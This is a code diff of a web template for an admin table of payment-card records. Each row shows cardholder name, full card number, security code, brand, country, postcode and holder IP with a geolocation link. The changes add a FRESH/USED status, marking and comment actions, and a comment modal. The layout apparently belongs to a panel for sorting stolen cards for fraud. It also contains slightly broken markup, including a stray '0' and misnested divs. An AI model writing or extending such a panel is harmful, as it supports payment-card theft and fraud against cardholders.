@@ -62,13 +62,13 @@
                         </thead>
                         <tbody>
                         {% for card in cards %}
-                            <tr>
+                            <tr data-statut="statut{{ card.statut }}">
                                 <td> {{ card.id }}</td>
                                 <td>
-                                    <a href="{{ path('blog_list', { 'id': card.id }) }}"
+                                    <a  id="opened"  href="{{ path('blog_list', { 'id': card.id }) }}"
                                        onclick=" window.open('{{ path('blog_list', { 'id': card.id }) }}',
                                     '_blank','width=800,height=600,scrollbars=1,menubar=no,status=yes,resizable=1,screenx=0,screeny=0');
-                                    return false;">
+                                    return false;" data-url-up='{{ path('opned_tr',{'id':card.id}) }}'>
                                      {{ card.addDate |date('Y-m-d H:i') }}
                                     </a> -
                                     {{ card.ccname }}
@@ -77,35 +77,59 @@
                                     {{ card.secode }}
                                     {{  card.ccno |replace({' ': ''}) }}
                                 </td>
-                                <td> TEST </td>
+                                {% if card.statut  == 0  %}
+                                <td> FRESH </td>
+                                {% else %}
+                                 <td> USED </td>
+                                {% endif %}
+
                                 <td>{{ card.ccbrand }} - {{ card.cclevel }} - {{ card.cctype }} - {{ card.cclevel }}</td>
                                 <td>{{ card.country }} {{ card.postcode }} <a href="http://www.localiser-ip.com/?ip={{ card.ip }}"  target="_blank" > {{ card.ip }}</a></td>
                                 <td class="dots_parent">
                                     <span>ooo</span>
                                     <ul   id="myDropdown" class="dots">
-                                        <a href=".modal"
-                                           onclick=" window.open('{{ path('blog_list', { 'id': card.id }) }}',
-                                                   '_blank','width=800,height=600,scrollbars=1,menubar=no,status=yes,resizable=1,screenx=0,screeny=0');
-                                                   return false;" class="option">
-                                            <i class="fa fa-refresh fa-fw"></i></a>
-                                        <a href="{{ path('blog_list', { 'id': card.id }) }}"
-                                           onclick=" window.open('{{ path('blog_list', { 'id': card.id }) }}',
-                                                   '_blank','width=800,height=600,scrollbars=1,menubar=no,status=yes,resizable=1,screenx=0,screeny=0');
-                                                   return false;"class="option">
-                                            <i class="fa fa-comment" ></i></a>
+                                        <a id="fresh" class="option"  data-url-up='{{ path('fresh_da',{'id':card.id}) }}'>
+                                            <i class="fa fa-refresh fa-fw"></i>
+                                        </a>
+                                        <a id='comm' data-id="{{ card.id }}" data-url="{{ path('commentaire') }}"  data-edit="{{ path('update_comment') }}" data-toggle="modal" data-target="#myModal" class="option">
+                                            <i class="fa fa-comment" ></i>
+                                        </a>
                                         <a class="option delete" data-id="{{ card.id }}" data-url-delete="{{ path('delete_v') }}">
-                                            <i class="fa fa-times fa-fw"></i></a>
+                                            <i class="fa fa-times fa-fw"></i>
+                                        </a>
                                     </ul>
                                 </td>
-
                             </tr>
                         {% endfor %}
-                        </tbody>
+0                        </tbody>
                     </table>
                 </div>
                 <!-- /.box-body -->
             </div>
         </div>
+        <!-- Modal -->
+        <div class="modal fade" id="myModal" role="dialog">
+            <div class="modal-dialog">
+        </div>
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">&times;</button>
+                <h4 class="modal-title">Modal Header</h4>
+            </div>
+            <form action="{{ path ('update_comment') }}" method="post">
+                <div class="modal-body">
+                    <input id="inp" name="id"  type="text" >
+                    <textarea placeholder="comment" class="comment" name="val"></textarea>
+                </div>
+                <div class="modal-footer">
+                    <button type="submit" class="btn btn-primary" >Save</button>
+                    <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+                </div>
+            </form>
+        </div>
 
         </div>
+        </div>
+        </div>
+
     {% endblock %}
